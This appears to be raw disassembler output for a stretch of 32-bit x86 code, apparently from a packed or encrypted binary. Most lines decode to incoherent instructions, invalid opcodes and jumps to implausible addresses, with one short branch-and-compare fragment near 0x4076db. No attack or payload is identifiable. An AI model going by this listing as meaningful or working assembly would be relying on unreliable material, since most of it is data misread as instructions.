  40732a:	imul   eax,DWORD PTR [eax-0x6c],0x8cd2d696
  407331:	shl    DWORD PTR [edi],cl
  407333:	sub    DWORD PTR [esp+esi*4+0x30],0xf427c4b8
  40733b:	xchg   edx,eax
  40733c:	mov    WORD PTR [ecx-0x305c9900],es
  407342:	inc    ecx
  407343:	lods   al,BYTE PTR ds:[esi]
  407344:	or     DWORD PTR [edx+0x5a78e57d],0x23
  40734b:	push   ds
  40734c:	nop
  40734d:	jmp    FWORD PTR [edi+0x15ac8b50]
  407353:	test   DWORD PTR [ebp-0x70],0x28fbffea
  40735a:	mov    eax,0xb132fb0c
  40735f:	ret    0xc47e
  407362:	lock jae 0x40732f
  407365:	aas    
  407366:	add    bh,cl
  407368:	mov    ah,0x8e
  40736a:	inc    ecx
  40736b:	lock loop 0x4073a8
  40736e:	mov    eax,0x54b80f03
  407373:	pop    ebp
  407374:	stos   DWORD PTR es:[edi],eax
  407375:	div    BYTE PTR [esi]
  407377:	and    DWORD PTR [ecx],esi
  407379:	je     0x407355
  40737b:	mov    ecx,edi
  40737d:	sahf   
  40737e:	or     ebx,DWORD PTR [ecx]
  407380:	add    BYTE PTR [ebp+0x63],dl
  407383:	scas   al,BYTE PTR es:[edi]
  407384:	push   esi
  407385:	aas    
  407386:	dec    ebx
  407387:	dec    esp
  407388:	xchg   esi,eax
  407389:	jmp    0xf739:0xa9c63cc0
  407390:	xor    bl,ch
  407392:	and    ch,BYTE PTR [eax-0x3]
  407395:	loop   0x4073d9
  407397:	shl    BYTE PTR [ecx],1
  407399:	(bad)  
  40739a:	pop    ss
  40739b:	shr    DWORD PTR [edi+edx*1],0x47
  40739f:	shl    BYTE PTR [ebp-0x14d2e561],cl
  4073a5:	mov    ah,0xa8
  4073a7:	push   ds
  4073a8:	mov    ds:0x8e37001c,eax
  4073ad:	dec    edi
  4073ae:	dec    edx
  4073af:	popf   
  4073b0:	or     al,0x25
  4073b2:	pop    ds
  4073b3:	pop    es
  4073b4:	adc    BYTE PTR [eax+0x673a2bf],ah
  4073ba:	jmp    0x24860c39
  4073bf:	push   eax
  4073c0:	fmul   DWORD PTR [eax-0x4b]
  4073c3:	pop    ecx
  4073c4:	shl    ch,cl
  4073c6:	pop    ds
  4073c7:	sub    BYTE PTR [ecx],dh
  4073c9:	jb     0x40735a
  4073cb:	loope  0x407402
  4073cd:	jmp    0x71b6:0x67f4f772
  4073d4:	fs ss iret 
  4073d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d9:	mov    esi,0x4faeb99d
  4073de:	dec    esi
  4073df:	xchg   BYTE PTR [edx],dh
  4073e1:	enterw 0xbe34,0xcf
  4073e6:	icebp  
  4073e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073e8:	sbb    bh,ah
  4073ea:	jmp    0x9eeaeb5f
  4073ef:	fcmovbe st,st(1)
  4073f1:	sbb    ecx,esi
  4073f3:	inc    ebx
  4073f4:	loope  0x407423
  4073f6:	pslld  mm6,QWORD PTR [eax-0x56]
  4073fa:	jle    0x407434
  4073fc:	mov    edx,?
  4073fe:	jae    0x407397
  407400:	and    esp,DWORD PTR [edi-0x72a9b2df]
  407406:	jbe    0x407425
  407408:	inc    esp
  407409:	int3   
  40740a:	and    eax,0xa23297bc
  40740f:	aam    0x19
  407411:	mov    ch,0xd3
  407413:	push   esp
  407414:	js     0x407429
  407416:	in     eax,0x41
  407418:	add    ebp,DWORD PTR [ebp-0x7c929dce]
  40741e:	mov    dh,0x82
  407420:	dec    ebx
  407421:	push   ecx
  407422:	ins    DWORD PTR es:[edi],dx
  407423:	mov    esp,DWORD PTR [eax-0x8f48b97]
  407429:	push   edx
  40742a:	xor    eax,0xd57ee902
  40742f:	shr    DWORD PTR [edi+ebx*4-0x2fd82abc],cl
  407436:	sbb    ecx,0x7e
  407439:	enter  0x9570,0x46
  40743d:	pop    edi
  40743e:	sub    BYTE PTR [eax],0xa9
  407441:	cmp    ebp,DWORD PTR [esi+0x4e]
  407444:	sbb    BYTE PTR [eax+0x427a2ac2],bh
  40744a:	outs   dx,BYTE PTR ds:[esi]
  40744b:	in     al,dx
  40744c:	sub    edi,DWORD PTR ds:0xfc73cfa5
  407452:	(bad)  
  407453:	mov    ebp,0xd55691f1
  407458:	mov    dl,0x5b
  40745a:	arpl   WORD PTR [edx],di
  40745c:	mov    dl,0xb
  40745e:	mov    ds:0x7fa0c189,al
  407463:	in     eax,dx
  407464:	call   0xf123c798
  407469:	dec    edi
  40746a:	cmc    
  40746b:	rol    DWORD PTR [ebp-0x681d37f0],cl
  407471:	ror    ch,1
  407473:	xchg   esi,eax
  407474:	pop    ebp
  407475:	das    
  407476:	xchg   ebx,eax
  407477:	lods   eax,DWORD PTR ds:[esi]
  407478:	add    al,0xd6
  40747a:	dec    edi
  40747b:	add    BYTE PTR [ebx-0x3a750079],dh
  407481:	jp     0x40743d
  407483:	bnd js 0x40742d
  407486:	mov    al,0xf5
  407488:	icebp  
  407489:	push   cs
  40748a:	mov    ah,0x1f
  40748c:	stc    
  40748d:	sar    BYTE PTR [edi+0x1feb0148],cl
  407493:	pop    edx
  407494:	bound  ebp,QWORD PTR [ebx-0x62]
  407497:	mov    esp,0xcecc2fdd
  40749c:	push   ebp
  40749d:	push   ebp
  40749e:	xchg   DWORD PTR [ebx-0x2b3405e6],edx
  4074a4:	test   BYTE PTR [eax+0x6e],ah
  4074a7:	add    al,0xb0
  4074a9:	cmp    eax,0x9169a3b3
  4074ae:	sub    DWORD PTR [edx],esp
  4074b0:	dec    eax
  4074b1:	neg    DWORD PTR [esi+0x5910b12]
  4074b7:	xchg   BYTE PTR [esi+ecx*4+0x59],dh
  4074bb:	aas    
  4074bc:	pusha  
  4074bd:	ret    0x4a4a
  4074c0:	inc    ecx
  4074c1:	and    eax,0x88200691
  4074c6:	jecxz  0x40746d
  4074c8:	aas    
  4074c9:	mov    bh,0xcf
  4074cb:	cmp    BYTE PTR [edi-0x57782598],bl
  4074d1:	call   0xe3d9:0x21c17261
  4074d8:	cli    
  4074d9:	loop   0x40747c
  4074db:	test   al,0x56
  4074dd:	ins    DWORD PTR es:[edi],dx
  4074de:	fcmovb st,st(0)
  4074e0:	ret    0xe8ce
  4074e3:	ins    BYTE PTR es:[edi],dx
  4074e4:	or     al,0x54
  4074e6:	xor    dh,BYTE PTR [esi+eax*8+0xcc28c89]
  4074ed:	pop    esp
  4074ee:	repz mov ss,WORD PTR [ebx+0xf]
  4074f2:	jl     0x40750a
  4074f4:	cld    
  4074f5:	shl    edi,0x72
  4074f8:	ret    0x527b
  4074fb:	mov    esp,0x895e4355
  407500:	in     eax,0xdb
  407502:	xchg   esp,eax
  407503:	inc    eax
  407504:	aaa    
  407505:	aam    0x3b
  407507:	sub    edx,DWORD PTR [ebp+0x13]
  40750a:	fmul   DWORD PTR [eax-0x1c]
  40750d:	test   BYTE PTR [edi-0x77],dh
  407510:	pushf  
  407511:	xor    ch,BYTE PTR [ebx-0x65]
  407514:	pop    edx
  407515:	(bad)  
  407516:	dec    ebp
  407517:	dec    ecx
  407518:	enter  0xfa18,0x9c
  40751c:	jl     0x4074ae
  40751e:	xchg   BYTE PTR [eax],ah
  407520:	inc    edx
  407521:	sub    eax,0xe700321
  407526:	mov    ch,BYTE PTR ds:0x6983750
  40752c:	jle    0x4074f3
  40752e:	xor    eax,0x912c1d4
  407533:	inc    edi
  407534:	pop    esp
  407535:	les    ebx,FWORD PTR [edi]
  407537:	add    ecx,0x37
  40753a:	sbb    eax,0xce80f3bb
  40753f:	push   cs
  407540:	mov    cl,0xf1
  407542:	pop    ebp
  407543:	rcr    DWORD PTR ds:0x61edea55,cl
  407549:	dec    eax
  40754a:	jb     0x4074f1
  40754c:	sbb    ch,BYTE PTR [ebx]
  40754e:	pop    ecx
  40754f:	stc    
  407550:	mov    al,0xac
  407552:	leave  
  407553:	fldcw  WORD PTR ds:0xe4655198
  407559:	icebp  
  40755a:	sahf   
  40755b:	les    ebx,FWORD PTR [edi]
  40755d:	inc    ebp
  40755e:	pop    ebp
  40755f:	xchg   ebx,eax
  407560:	mov    ds,WORD PTR [ebp+0x31c1ed5c]
  407566:	mov    DWORD PTR [ecx],eax
  407568:	fist   DWORD PTR [ebx+0x75cfc515]
  40756e:	cmp    al,BYTE PTR ds:0x9f7fb0f2
  407574:	pop    es
  407575:	inc    ebp
  407576:	push   ds
  407577:	ds jmp 0x4075a0
  40757a:	arpl   WORD PTR [eax-0x20],bx
  40757d:	pop    ebx
  40757e:	xor    cl,BYTE PTR [ecx-0x709b60bb]
  407584:	leave  
  407585:	neg    DWORD PTR [ecx-0x6d5e4647]
  40758b:	mov    eax,0xe4bc162d
  407590:	jmp    0x89b44819
  407595:	sbb    edx,DWORD PTR [edx-0x13]
  407598:	test   al,0x17
  40759a:	mov    dl,0x98
  40759c:	lods   al,BYTE PTR ds:[esi]
  40759d:	shl    dh,1
  40759f:	ror    esi,1
  4075a1:	test   edx,ebx
  4075a3:	das    
  4075a4:	leave  
  4075a5:	inc    ebx
  4075a6:	add    DWORD PTR [ebx+0x15],ebx
  4075a9:	jb     0x4075b8
  4075ab:	jmp    0x56b3587
  4075b0:	mov    ebx,0xc5fd0d5b
  4075b5:	add    ah,BYTE PTR [edi+0x2196fcd6]
  4075bb:	and    BYTE PTR [ebx+0x369e0603],al
  4075c1:	adc    esi,DWORD PTR [ecx]
  4075c3:	push   es
  4075c4:	jl     0x407586
  4075c6:	jmp    0x450e16a5
  4075cb:	ret    0x55a8
  4075ce:	js     0x407593
  4075d0:	cwde   
  4075d1:	stc    
  4075d2:	add    ebp,DWORD PTR ds:0x81798fa9
  4075d8:	lea    edi,[eax+0x6c]
  4075db:	je     0x4075d5
  4075dd:	mov    esp,0x6c66e12f
  4075e2:	jmp    0xa4ae5daa
  4075e7:	jb     0x407569
  4075e9:	sub    al,0xa8
  4075eb:	or     edi,esi
  4075ed:	int3   
  4075ee:	and    al,0x7c
  4075f0:	cdq    
  4075f1:	into   
  4075f2:	jnp    0x407600
  4075f4:	aam    0x61
  4075f6:	jo     0x407663
  4075f8:	not    BYTE PTR gs:[edx-0x7a]
  4075fc:	dec    eax
  4075fd:	or     dh,BYTE PTR [ebx]
  4075ff:	push   ebp
  407600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407601:	ret    
  407602:	jle    0x407599
  407604:	(bad)  
  407606:	retf   0xbee6
  407609:	inc    edx
  40760a:	jns    0x4075c5
  40760c:	or     DWORD PTR [ebx-0x3d29774e],ebx
  407612:	fmul   DWORD PTR [ecx-0x7af08e71]
  407618:	dec    edi
  407619:	mov    edx,0x4b325bcc
  40761e:	jg     0x4075ae
  407620:	call   DWORD PTR [eax]
  407622:	dec    esp
  407623:	jne    0x40763f
  407625:	ins    BYTE PTR es:[edi],dx
  407626:	pop    ebp
  407627:	fld    QWORD PTR [eax]
  407629:	adc    bh,BYTE PTR [esi-0x1f]
  40762c:	sub    DWORD PTR [ecx-0x15],esp
  40762f:	push   ss
  407630:	dec    ebx
  407631:	pop    es
  407632:	aad    0xb8
  407634:	sti    
  407635:	jb     0x4076b1
  407637:	lds    ebx,FWORD PTR [esi]
  407639:	das    
  40763a:	(bad)  
  40763b:	fwait
  40763c:	cld    
  40763d:	inc    ebp
  40763e:	int    0x4c
  407640:	mov    ecx,0xfe7df48e
  407645:	sub    eax,eax
  407647:	mov    eax,0xc2eee65a
  40764c:	into   
  40764d:	das    
  40764e:	pop    ss
  40764f:	aas    
  407650:	sub    al,0x7f
  407652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407653:	xchg   ecx,eax
  407654:	bound  esp,QWORD PTR [eax]
  407656:	mov    ecx,0x7ba0059d
  40765b:	sub    DWORD PTR [eax],0xffffff83
  40765e:	mov    esp,edi
  407660:	pushf  
  407661:	gs sbb eax,0x8f3f5b53
  407667:	jno    0x407655
  407669:	gs pop ss
  40766b:	jne    0x407604
  40766d:	or     ecx,esp
  40766f:	jg     0x4076b8
  407671:	adc    ch,BYTE PTR [eax-0x57]
  407674:	stc    
  407675:	rcl    WORD PTR [edi-0x185bf5f1],0xa7
  40767d:	shl    BYTE PTR [edi],0x9b
  407680:	(bad)  
  407681:	in     al,dx
  407682:	jecxz  0x4076f0
  407684:	cmp    eax,0x488c5b6a
  407689:	add    DWORD PTR [ecx+0x47],ebp
  40768c:	add    BYTE PTR [edi+0x16005062],0xeb
  407693:	aas    
  407694:	lock mov WORD PTR [ebx+0x613aeace],ds
  40769b:	call   0xc8c8:0x984cdb4f
  4076a2:	jge    0x4076fa
  4076a4:	pop    esi
  4076a5:	sti    
  4076a6:	test   al,0xf7
  4076a8:	pushw  ds
  4076aa:	jb     0x4076e1
  4076ac:	outs   dx,BYTE PTR ds:[esi]
  4076ad:	mov    fs,ebp
  4076af:	bound  ecx,QWORD PTR [ecx]
  4076b1:	dec    esp
  4076b2:	pop    edi
  4076b3:	mov    ds:0x64de5ca6,eax
  4076b8:	retf   
  4076b9:	js     0x4076f5
  4076bb:	out    dx,eax
  4076bc:	bound  esi,QWORD PTR [edx]
  4076be:	sti    
  4076bf:	xchg   DWORD PTR [edi+eiz*8-0x7c44693b],ebp
  4076c6:	push   edx
  4076c7:	jo     0x407729
  4076c9:	xchg   ecx,eax
  4076ca:	jb     0x40768b
  4076cc:	jp     0x4076b8
  4076ce:	dec    esp
  4076cf:	dec    esp
  4076d0:	sub    bh,BYTE PTR [esi-0x43352f2b]
  4076d6:	pop    ebx
  4076d7:	leave  
  4076d8:	ret    0x4
  4076db:	mov    eax,DWORD PTR [ebp-0xc]
  4076de:	add    eax,DWORD PTR [ebp-0x18]
  4076e1:	cmp    eax,0x89f4544a
  4076e6:	je     0x4076fa
  4076ec:	mov    eax,DWORD PTR [ebp-0x10]
  4076ef:	and    DWORD PTR [eax],0x751c9e
  4076f5:	jmp    0x4072df
  4076fa:	mov    eax,DWORD PTR [ebp-0xc]
  4076fd:	mov    edx,DWORD PTR [ebp-0x18]
  407700:	or     eax,edx
  407702:	cmp    eax,0xf9df2fbe
  407707:	je     0x407b09
  40770d:	jmp    0x407afb
  407712:	ret    
  407713:	or     esi,DWORD PTR [ebx+eiz*1+0x7c]
  407717:	ins    DWORD PTR es:[edi],dx
  407718:	pop    ebp
  407719:	jmp    0x407762
  40771b:	(bad)  
  40771c:	pop    ecx
  40771d:	sbb    eax,0xdcace7c
  407722:	or     bl,cl
  407724:	jle    0x4077a4
  407726:	dec    edi
  407727:	jns    0x4077a7
  407729:	jle    0x40777a
  40772b:	cmp    eax,0x9bc82733
  407730:	push   eax
  407731:	stc    
  407732:	mov    dl,0xdb
  407734:	pop    ebp
  407735:	hlt    
  407736:	jl     0x407741
  407738:	das    
  407739:	mov    bh,0xba
  40773b:	add    eax,0xdd0eef33
  407740:	dec    ecx
  407741:	pop    esi
  407742:	scas   al,BYTE PTR es:[edi]
  407743:	and    ecx,ebp
  407745:	pushf  
  407746:	mov    dh,BYTE PTR [eax]
  407748:	loop   0x407749
  40774a:	lods   al,BYTE PTR ds:[esi]
  40774b:	loope  0x407757
  40774d:	mov    esi,0xa3967158
  407752:	loop   0x407743
  407754:	gs mov ebp,0x5b4df92
  40775a:	icebp  
  40775b:	in     al,dx
  40775c:	cmp    al,0x71
  40775e:	or     edi,DWORD PTR [eax+0x31]
  407761:	xchg   edi,eax
  407762:	inc    ebp
  407763:	or     esp,DWORD PTR [esi+0x535dd529]
  407769:	mov    ch,0xae
  40776b:	or     ecx,DWORD PTR [eax+0x4c099ca4]
  407771:	inc    ebx
  407772:	and    ecx,DWORD PTR [esi+0x57cb8eee]
  407778:	jp     0x407783
  40777a:	inc    esp
  40777b:	loope  0x4077f3
  40777d:	mov    al,ds:0x672a7977
  407782:	and    DWORD PTR [ebx-0x16cafe85],0xffffffb0
  407789:	call   0xa4767bc7
  40778e:	addr16 dec ebp
  407790:	repnz or DWORD PTR [ebx-0x3c],esi
  407794:	rcl    BYTE PTR [esi+0x55],0x44
  407798:	clc    
  407799:	shl    BYTE PTR [edi+eiz*1],1
  40779c:	sbb    al,0xc0
  40779e:	imul   eax,DWORD PTR [ecx-0x7],0x5c
  4077a2:	and    DWORD PTR [ebp-0x1],ebx
  4077a5:	addr16 addr16 lahf 
  4077a8:	test   al,0x32
  4077aa:	imul   eax,DWORD PTR [ebx+0x60],0xc4150ffd
  4077b1:	xchg   DWORD PTR [edx-0x4d],edi
  4077b4:	and    esi,esi
  4077b6:	xor    eax,0x3dc40a21
  4077bb:	cmp    dh,BYTE PTR [edi-0x7d]
  4077be:	fwait
  4077bf:	xchg   edx,eax
  4077c0:	jmp    0xdf99:0xa80ce710
  4077c7:	sub    al,0x74
  4077c9:	retf   
  4077ca:	push   edi
  4077cb:	je     0x4077f3
  4077cd:	jmp    0xd9fc9914
  4077d2:	retf   0x6a19
  4077d5:	lahf   
  4077d6:	and    eax,0x1903bfc0
  4077db:	ja     0x40778b
  4077dd:	sub    BYTE PTR [edi],bl
  4077df:	ds leave 
  4077e1:	pop    ebx
  4077e2:	inc    edx
  4077e3:	and    esi,edx
  4077e5:	mov    ah,0xf4
  4077e7:	cdq    
  4077e8:	jge    0x40778a
  4077ea:	and    dh,BYTE PTR [eax]
  4077ec:	push   es
  4077ed:	sub    al,0xc
  4077ef:	mul    BYTE PTR [edx+edi*4-0x54]
  4077f3:	mov    edi,0x208fc41d
  4077f8:	dec    esp
  4077f9:	mov    edi,DWORD PTR [edi+edi*1]
  4077fc:	cmp    BYTE PTR [edx+eiz*2],cl
  4077ff:	sar    BYTE PTR [eax-0x7c],0x39
  407803:	ret    0xfb2e
  407806:	pop    ebp
  407807:	jbe    0x40780d
  407809:	add    BYTE PTR [ebx+edi*2-0x12],bh
  40780d:	(bad)  
  40780f:	nop
  407810:	stc    
  407811:	jmp    0x61006684
  407816:	(bad)  
  407817:	cmp    DWORD PTR [ecx],eax
  407819:	aas    
  40781a:	ret    
  40781b:	cmp    cl,bl
  40781d:	push   0xf3b3e835
  407822:	dec    edx
  407823:	sub    DWORD PTR [edx],edx
  407825:	dec    ebx
  407826:	push   eax
  407827:	icebp  
  407828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407829:	arpl   WORD PTR [esi+eax*1-0x6db45e46],cx
  407830:	push   ss
  407831:	lods   eax,DWORD PTR ds:[esi]
  407832:	adc    DWORD PTR [eax],0xf7e2414
  407838:	adc    bl,BYTE PTR [ebx+0x3b601cd]
  40783e:	out    dx,al
  40783f:	ds loopne 0x407863
  407842:	ret    
  407843:	stos   DWORD PTR es:[edi],eax
  407844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407845:	and    eax,0x22e82f18
  40784a:	fist   DWORD PTR [esp+ebp*1-0x72]
  40784e:	enter  0xe7a5,0x59
  407852:	sub    DWORD PTR [eax+0x29],ecx
  407855:	dec    ebp
  407856:	(bad)  [edi]
  407858:	dec    ecx
  407859:	inc    edx
  40785a:	sub    bh,BYTE PTR [ecx]
  40785c:	sub    esi,edi
  40785e:	aaa    
  40785f:	in     al,dx
  407860:	pop    edi
  407861:	mov    edi,DWORD PTR [eax]
  407863:	jmp    0x3d3c:0xc882450a
  40786a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40786b:	clc    
  40786c:	pop    esi
  40786d:	push   es
  40786e:	popf   
  40786f:	nop
  407870:	out    dx,al
  407871:	out    0x59,eax
  407873:	scas   al,BYTE PTR es:[edi]
  407874:	push   eax
  407875:	ins    DWORD PTR es:[edi],dx
  407876:	ins    BYTE PTR es:[edi],dx
  407877:	sub    dh,bl
  407879:	fidiv  DWORD PTR [edx]
  40787b:	sub    BYTE PTR [esi+0x1b26c694],dh
  407881:	xor    DWORD PTR [si-0x4d23],eax
  407886:	mov    eax,edx
  407888:	vsqrtpd ymm5,YMMWORD PTR [ebx+0x16]
  40788d:	pop    ebp
  40788e:	mov    dl,0x35
  407890:	cmp    BYTE PTR [edx],bh
  407892:	add    DWORD PTR [ebx+ebp*1],0x616fb263
  407899:	loope  0x407860
  40789b:	aas    
  40789c:	xor    al,0x13
  40789e:	js     0x4078f2
  4078a0:	and    eax,0xcda04ca8
  4078a5:	adc    BYTE PTR [esi+esi*4],bh
  4078a8:	mov    ah,0xd6
  4078aa:	xchg   BYTE PTR [eax-0x46],ch
  4078ad:	outs   dx,DWORD PTR ds:[esi]
  4078ae:	xor    edi,DWORD PTR [ebx-0xd]
  4078b1:	shr    DWORD PTR [esp],1
  4078b4:	ret    
  4078b5:	pop    ecx
  4078b6:	adc    dh,dh
  4078b8:	xor    ch,al
  4078ba:	rol    DWORD PTR [ecx],0xa4
  4078bd:	test   al,0xfa
  4078bf:	dec    edx
  4078c0:	and    eax,0x151401c
  4078c5:	data16 jns 0x4078ef
  4078c8:	int    0x1e
  4078ca:	scas   al,BYTE PTR es:[edi]
  4078cb:	cmp    ebp,DWORD PTR [esi+0x47]
  4078ce:	(bad)  
  4078cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078d0:	scas   eax,DWORD PTR es:[edi]
  4078d1:	ss jae 0x40793f
  4078d4:	adc    BYTE PTR [ecx],dh
  4078d6:	or     eax,ecx
  4078d8:	iret   
  4078d9:	jno    0x4078da
  4078db:	int    0x1e
  4078dd:	add    eax,0x83089073
  4078e2:	inc    ecx
  4078e3:	hlt    
  4078e4:	adc    BYTE PTR ds:0x541a73d6,bl
  4078ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078eb:	cmp    dh,BYTE PTR [ecx]
  4078ed:	shr    BYTE PTR [ebp+0x4e],1
  4078f0:	lods   eax,DWORD PTR ds:[esi]
  4078f1:	daa    
  4078f2:	lock hlt 
  4078f4:	stos   DWORD PTR es:[edi],eax
  4078f5:	rcr    ah,1
  4078f7:	imul   edx,DWORD PTR [edx],0xdd91d978
  4078fd:	popa   
  4078fe:	dec    ebx
  4078ff:	jmp    0x407890
  407901:	mov    dh,cl
  407903:	sub    eax,0x78d96e2d
  407908:	aam    0xc1
  40790a:	and    cl,cl
  40790c:	call   0xe71088d6
  407911:	outs   dx,BYTE PTR ds:[esi]
  407912:	sub    al,0x9d
  407914:	jmp    DWORD PTR [esp+eiz*2+0x48cd1628]
  40791b:	call   0xbabb:0x992a7208
  407922:	xor    DWORD PTR [edi],0x40
  407925:	scas   eax,DWORD PTR es:[edi]
  407926:	mov    esp,0x94320b17
  40792b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40792c:	xlat   BYTE PTR ds:[ebx]
  40792d:	or     edi,DWORD PTR [edi+eax*1]
  407930:	call   FWORD PTR [esi]
  407932:	arpl   WORD PTR [edx],ax
  407934:	lods   eax,DWORD PTR ds:[esi]
  407935:	jno    0x407999
  407937:	lds    ecx,FWORD PTR [ebp-0x3db62c80]
  40793d:	ret    
  40793e:	jg     0x407904
  407940:	push   cs
  407941:	aaa    
  407942:	pop    ebx
  407943:	sbb    ebx,esp
  407945:	mov    bh,0xd0
  407947:	dec    esp
  407948:	mov    dl,0xaa
  40794a:	pop    ecx
  40794b:	xchg   edi,eax
  40794c:	dec    BYTE PTR [edx+0x2cbf50fd]
  407952:	pusha  
  407953:	fild   QWORD PTR ds:[ebp+esi*2-0x34e36e4b]
  40795b:	int3   
  40795c:	jp     0x407975
  40795e:	push   edx
  40795f:	xor    eax,0xe1c143e
  407964:	push   0x78cfac51
  407969:	pop    edx
  40796a:	jl     0x40797d
  40796c:	add    dh,ah
  40796e:	in     eax,dx
  40796f:	push   ds
  407970:	xor    DWORD PTR [ecx+ebx*2],0x8d8c0e47
  407977:	shl    BYTE PTR [eax-0x11eac342],1
  40797d:	aad    0x9f
  40797f:	add    DWORD PTR [ebp-0x1e],0x78
  407983:	or     cl,BYTE PTR [ecx+0x3a]
  407986:	fist   WORD PTR [edx+0x21dd598a]
  40798c:	sub    DWORD PTR [eax],ebp
  40798e:	mov    bl,0xfa
  407990:	push   ecx
  407991:	cmc    
  407992:	in     al,0xfb
  407994:	push   cs
  407995:	sahf   
  407996:	inc    ebp
  407997:	mov    eax,ds:0x9e731e6a
  40799c:	cmp    BYTE PTR [edi-0x77],ch
  40799f:	in     al,dx
  4079a0:	pusha  
  4079a1:	jmp    0x4079ef
  4079a3:	sub    edi,DWORD PTR [eax-0x3de95276]
  4079a9:	std    
  4079aa:	xchg   BYTE PTR [esi-0x57],bh
  4079ad:	int3   
  4079ae:	xor    ebx,DWORD PTR [edi]
  4079b0:	fnstenv [ecx+0x51]
  4079b3:	cs aaa 
  4079b5:	xchg   esi,eax
  4079b6:	ja     0x407a1a
  4079b8:	lock dec ebx
  4079ba:	push   ecx
  4079bb:	cmp    edi,DWORD PTR [ecx+esi*1-0x3]
  4079bf:	dec    edi
  4079c0:	aad    0x31
  4079c2:	mov    ds:0x39636a5b,eax
  4079c7:	mov    cl,0x35
  4079c9:	mov    esp,0xf1a4e105
  4079ce:	pop    edi
  4079cf:	mov    fs,esp
  4079d1:	fild   WORD PTR [ecx]
  4079d3:	cli    
  4079d4:	(bad)
  4079d7:	fist   DWORD PTR [ecx-0x13]
  4079da:	mov    dl,BYTE PTR [esi-0x31]
  4079dd:	jecxz  0x4079be
  4079df:	imul   esp,DWORD PTR [esi+esi*8-0x5f],0xffffff95
  4079e4:	test   BYTE PTR [ebx-0x22],0xa
  4079e8:	xor    bl,BYTE PTR [edi]
  4079ea:	dec    esi
  4079eb:	addr16 jmp 0x407a25
  4079ee:	sbb    bl,BYTE PTR [ecx+0x73b2fcc0]
  4079f4:	pop    esi
  4079f5:	sbb    dl,BYTE PTR [ebx-0x35]
  4079f8:	je     0x4079e1
  4079fa:	xchg   ebp,eax
  4079fb:	mov    dh,0x46
  4079fd:	loope  0x407a0c
  4079ff:	add    edx,DWORD PTR [ecx]
  407a01:	cli    
  407a02:	ins    DWORD PTR es:[edi],dx
  407a03:	pop    es
  407a04:	xor    eax,0x6cdce76e
  407a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a0a:	dec    ecx
  407a0b:	xchg   ebx,eax
  407a0c:	add    al,0xb
  407a0e:	and    eax,0xb0eed322
  407a13:	clc    
  407a14:	aad    0x2e
  407a16:	int    0xab
  407a18:	xor    eax,0x52662f0e
  407a1d:	test   ecx,0xf8640f56
  407a23:	into   
  407a24:	icebp  
  407a25:	nop
  407a26:	mov    esi,0x426b04a3
  407a2b:	popa   
  407a2c:	mov    BYTE PTR [ebx+0x50eba35b],ah
  407a32:	fcomp  QWORD PTR [ecx]
  407a34:	in     al,dx
  407a35:	hlt    
  407a36:	in     al,dx
  407a37:	lods   eax,DWORD PTR gs:[esi]
  407a39:	out    0xba,eax
  407a3b:	retf   
  407a3c:	cld    
  407a3d:	out    dx,eax
  407a3e:	or     BYTE PTR [ebp+0x7f],dl
  407a41:	inc    esp
  407a42:	mov    al,0x2
  407a44:	int3   
  407a45:	out    0xc7,eax
  407a47:	scas   al,BYTE PTR es:[edi]
  407a48:	sub    edi,DWORD PTR [edi]
  407a4a:	adc    al,0x28
  407a4c:	loope  0x407a98
  407a4e:	pusha  
  407a4f:	lock sbb esi,esp
  407a52:	outs   dx,DWORD PTR ds:[esi]
  407a53:	cmc    
  407a54:	or     ebx,DWORD PTR fs:[ecx+0x7d53c810]
  407a5b:	xchg   ebx,eax
  407a5c:	(bad)  
  407a5d:	aas    
  407a5e:	sub    edx,DWORD PTR [edi]
  407a60:	je     0x407a81
  407a62:	add    esp,eax
  407a64:	ja     0x407ae0
  407a66:	add    al,0xd7
  407a68:	out    dx,eax
  407a69:	mov    esi,0x14f77260
  407a6e:	xchg   al,dh
  407a70:	adc    al,0x46
  407a72:	mov    bh,0xe
  407a74:	int3   
  407a75:	mov    eax,0x52df58f7
  407a7a:	inc    edi
  407a7b:	add    al,0xc3
  407a7d:	adc    bh,ah
  407a7f:	imul   edi,DWORD PTR [edi-0x38],0x501890b5
  407a86:	or     ah,ah
  407a88:	or     ebx,0x22cdf567
  407a8e:	sbb    eax,0xaee6a1ea
  407a93:	xchg   ecx,eax
  407a94:	xor    BYTE PTR [ebp+0x432ea47e],dh
  407a9a:	sti    
  407a9b:	jbe    0x407add
  407a9d:	ins    DWORD PTR es:[edi],dx
  407a9e:	dec    edi
  407a9f:	jl     0x407a52
  407aa1:	gs (bad) 
  407aa3:	(bad)  
  407aa4:	adc    DWORD PTR [eax-0x39],edx
  407aa7:	call   FWORD PTR [edi]
  407aa9:	imul   ebx,DWORD PTR [ebx-0x7d],0xe84452f9
  407ab0:	and    DWORD PTR [edi],edx
  407ab2:	inc    esp
  407ab3:	pop    edx
  407ab4:	xor    eax,0xadc2e551
  407ab9:	or     ch,BYTE PTR ds:0x44522a88
  407abf:	xor    BYTE PTR [ebx-0x5],0x1e
  407ac3:	add    BYTE PTR [ecx+0x21],0x53
  407ac7:	push   esp
  407ac8:	pop    edi
  407ac9:	mov    ecx,0xcdbe83dc
  407ace:	jmp    0x4b2d210d
  407ad3:	mov    ah,0xfa
  407ad5:	push   ss
  407ad6:	pop    edx
  407ad7:	mov    bh,bh
  407ad9:	cwde   
  407ada:	jno    0x407ae6
  407adc:	fidiv  DWORD PTR [esi]
  407ade:	push   0x52
  407ae0:	stc    
  407ae1:	inc    ebx
  407ae2:	dec    ebx
  407ae3:	pop    ebx
  407ae4:	mov    BYTE PTR [edi],bl
  407ae6:	xor    al,0x40
  407ae8:	sub    BYTE PTR [esi+0x32],bh
  407aeb:	out    0x57,eax
  407aed:	scas   al,BYTE PTR es:[edi]
  407aee:	xor    al,0x24
  407af0:	mov    edx,0x2309f43d
  407af5:	(bad)  
  407af6:	loope  0x407b66
  407af8:	gs arpl ax,bp
